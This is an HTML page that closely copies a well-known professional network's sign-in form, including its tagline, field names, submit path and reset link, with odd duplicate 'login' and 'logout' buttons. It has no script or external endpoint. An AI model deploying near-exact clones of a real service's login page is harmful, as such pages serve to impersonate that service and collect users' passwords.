<html>
    <body>
    <div id="" class="card-layout">
        <div id="organic-div" class="">
            <div class="header__content ">
                <h1 class="header__content__heading ">Sign in</h1>
                <p class="header__content__subheading ">Stay updated on your professional world</p>
            </div>
            <form method="post" class="login__form" action="/checkpoint/lg/login-submit" novalidate="">
                
                <div class="form__input--floating mt-24">
                    <input id="username" name="session_key" type="text" aria-describedby="error-for-username" required="" validation="email|tel" class="" autofocus="" aria-label="Email or Phone">
                    <label class="form__label--floating" for="username" aria-hidden="true">Email or Phone</label>
                    <div error-for="username" id="error-for-username" class="form__label--error  hidden" role="alert" aria-live="assertive">

                    </div>
                </div>
                <div class="form__input--floating mt-24">
                    <input id="password" type="password" aria-describedby="error-for-password" name="session_password" required="" validation="password" class="" aria-label="Password">
                    <label for="password" class="form__label--floating" aria-hidden="true">Password</label>
                 <div error-for="password" id="error-for-password" class="form__label--error   hidden" role="alert" aria-live="assertive"></div>
                </div>
                    <a href="/checkpoint/rp/request-password-reset?trk=guest_homepage-basic_nav-header-signin" class="btn__tertiary--medium forgot-password" data-cie-control-urn="forgot-password-btn">Forgot password?</a>
                    <div class="login__form_action_container ">
                        <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" type="submit" aria-label="Sign in">login </button>
                        <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" type="submit" aria-label="Sign in">logout</button>

                    </div>
                </form>
               
        </div>
    </div>
</body>
</html>
